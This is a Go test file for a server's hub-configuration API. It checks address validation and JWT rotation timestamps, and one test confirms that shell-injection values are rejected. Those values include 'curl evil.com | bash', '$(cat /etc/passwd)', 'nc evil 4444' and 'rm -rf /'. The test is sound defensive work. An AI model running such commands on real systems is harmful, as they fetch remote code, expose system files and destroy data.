package server

import (
	"bytes"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"testing"
)

func TestUpdateHubConfig_ValidAddress(t *testing.T) {
	s := testServer(t)
	token := registerAndGetAdminToken(t, s)

	body := bytes.NewBufferString(`{"grpc_external_addr":"myhost.example.com:9443"}`)
	req := httptest.NewRequest("PUT", testHubSettingsPath, body)
	req.Header.Set("Authorization", testBearerPrefix+token)
	rec := httptest.NewRecorder()
	s.routes().ServeHTTP(rec, req)

	if rec.Code != http.StatusOK {
		t.Fatalf(testExpected200Body, rec.Code, rec.Body.String())
	}
}

func TestUpdateHubConfig_EmptyAddress(t *testing.T) {
	s := testServer(t)
	token := registerAndGetAdminToken(t, s)

	body := bytes.NewBufferString(`{"grpc_external_addr":""}`)
	req := httptest.NewRequest("PUT", testHubSettingsPath, body)
	req.Header.Set("Authorization", testBearerPrefix+token)
	rec := httptest.NewRecorder()
	s.routes().ServeHTTP(rec, req)

	if rec.Code != http.StatusOK {
		t.Fatalf("expected 200 for empty address (reset), got %d: %s", rec.Code, rec.Body.String())
	}
}

func TestUpdateHubConfig_ShellInjection(t *testing.T) {
	s := testServer(t)
	token := registerAndGetAdminToken(t, s)

	tests := []struct {
		name string
		addr string
	}{
		{"semicolon", "; curl evil.com | bash #"},
		{"backtick", "`whoami`"},
		{"dollar", "$(cat /etc/passwd)"},
		{"pipe", "host | nc evil 4444"},
		{"ampersand", "host & rm -rf /"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			body := bytes.NewBufferString(`{"grpc_external_addr":"` + tt.addr + `"}`)
			req := httptest.NewRequest("PUT", testHubSettingsPath, body)
			req.Header.Set("Authorization", testBearerPrefix+token)
			rec := httptest.NewRecorder()
			s.routes().ServeHTTP(rec, req)

			if rec.Code != http.StatusBadRequest {
				t.Fatalf("expected 400 for injection attempt %q, got %d: %s", tt.addr, rec.Code, rec.Body.String())
			}
		})
	}
}

func TestUpdateHubConfig_IPv6Address(t *testing.T) {
	s := testServer(t)
	token := registerAndGetAdminToken(t, s)

	body := bytes.NewBufferString(`{"grpc_external_addr":"[::1]:9443"}`)
	req := httptest.NewRequest("PUT", testHubSettingsPath, body)
	req.Header.Set("Authorization", testBearerPrefix+token)
	rec := httptest.NewRecorder()
	s.routes().ServeHTTP(rec, req)

	if rec.Code != http.StatusOK {
		t.Fatalf("expected 200 for IPv6 address, got %d: %s", rec.Code, rec.Body.String())
	}
}

func TestHandleGetHubConfig_JWTRotatedAt_Absent(t *testing.T) {
	s := testServer(t)
	token := registerAndGetAdminToken(t, s)

	req := httptest.NewRequest("GET", testHubSettingsPath, nil)
	req.Header.Set("Authorization", testBearerPrefix+token)
	rec := httptest.NewRecorder()
	s.routes().ServeHTTP(rec, req)

	if rec.Code != http.StatusOK {
		t.Fatalf(testExpected200Body, rec.Code, rec.Body.String())
	}

	var resp map[string]interface{}
	if err := json.NewDecoder(rec.Body).Decode(&resp); err != nil {
		t.Fatalf(testDecodeRespErr, err)
	}

	if _, ok := resp["jwt_secret_rotated_at"]; ok {
		t.Fatalf("expected jwt_secret_rotated_at to be absent when never rotated, but it was present: %v", resp["jwt_secret_rotated_at"])
	}
}

func TestHandleGetHubConfig_JWTRotatedAt_Present(t *testing.T) {
	s := testServer(t)
	token := registerAndGetAdminToken(t, s)

	const rotatedAt = "2026-06-12T04:10:00Z"
	if err := s.store.SetConfig("jwt_secret_rotated_at", rotatedAt); err != nil {
		t.Fatalf("set config: %v", err)
	}

	req := httptest.NewRequest("GET", testHubSettingsPath, nil)
	req.Header.Set("Authorization", testBearerPrefix+token)
	rec := httptest.NewRecorder()
	s.routes().ServeHTTP(rec, req)

	if rec.Code != http.StatusOK {
		t.Fatalf(testExpected200Body, rec.Code, rec.Body.String())
	}

	var resp map[string]interface{}
	if err := json.NewDecoder(rec.Body).Decode(&resp); err != nil {
		t.Fatalf(testDecodeRespErr, err)
	}

	got, ok := resp["jwt_secret_rotated_at"]
	if !ok {
		t.Fatal("expected jwt_secret_rotated_at to be present in response")
	}
	if got != rotatedAt {
		t.Fatalf("expected jwt_secret_rotated_at %q, got %q", rotatedAt, got)
	}
}

func TestHandleUpdateHubConfig_JWTRotatedAt_Ignored(t *testing.T) {
	s := testServer(t)
	token := registerAndGetAdminToken(t, s)

	const originalRotatedAt = "2026-06-12T04:10:00Z"
	if err := s.store.SetConfig("jwt_secret_rotated_at", originalRotatedAt); err != nil {
		t.Fatalf("set config: %v", err)
	}

	// PUT with jwt_secret_rotated_at in body — must be ignored.
	body := bytes.NewBufferString(`{"grpc_external_addr":"myhost.example.com:9443","jwt_secret_rotated_at":"2000-01-01T00:00:00Z"}`)
	req := httptest.NewRequest("PUT", testHubSettingsPath, body)
	req.Header.Set("Authorization", testBearerPrefix+token)
	rec := httptest.NewRecorder()
	s.routes().ServeHTTP(rec, req)

	if rec.Code != http.StatusOK {
		t.Fatalf(testExpected200Body, rec.Code, rec.Body.String())
	}

	// Verify stored value is unchanged.
	stored, err := s.store.GetConfig("jwt_secret_rotated_at")
	if err != nil {
		t.Fatalf("get config after PUT: %v", err)
	}
	if stored != originalRotatedAt {
		t.Fatalf("expected stored jwt_secret_rotated_at %q unchanged, got %q", originalRotatedAt, stored)
	}
}
